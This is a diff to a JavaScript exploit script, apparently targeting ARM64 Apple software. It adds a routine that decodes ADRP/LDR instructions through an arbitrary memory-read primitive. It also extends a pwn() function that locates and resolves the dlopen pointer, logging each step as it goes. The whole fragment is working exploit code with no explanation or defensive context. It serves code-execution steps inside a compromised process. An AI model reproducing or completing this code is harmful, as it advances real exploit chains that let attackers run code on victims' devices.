@@ -115,6 +115,28 @@ function follow_bl(addr) {
     return addr;
 }
 
+
+function follow_adrpLdr(addr)
+{
+    var op = read32(addr);
+    
+    var imm_hi_lo = (op >> 3)  & 0x1FFFFC;
+    imm_hi_lo |= ((op >> 29) & 0x3);
+    if ((op & 0x800000) != 0) {
+        imm_hi_lo |= 0xFFFFFFFFFFE00000;
+    }
+    
+    var imm = imm_hi_lo << 12;
+
+    var ret = Add(Sub(addr, addr.lo() & 0xfff), imm);
+    
+    var op2 = read32(Add(addr, 4));
+    var imm12 = ((op2 >> 10) & 0xFFF) << 3;
+    ret = Add(ret, imm12);
+    
+    return ret;
+}
+
 function pwn() {
     offsets.resolve();
 
@@ -266,10 +288,11 @@ function pwn() {
     }
     log(`[+] found bl _dlopen addr: ${bl_dlopen_addr}`);
 
-    // where to call?
-    // BL addr
     var dlopen_addr = follow_bl(bl_dlopen_addr);
     log(`[+] dlopen_addr: ${dlopen_addr}`);
+
+    var dlopen_ptr = follow_adrpLdr(dlopen_addr);
+    log(`[+] dlopen_ptr: ${dlopen_ptr}`);
 
 
 
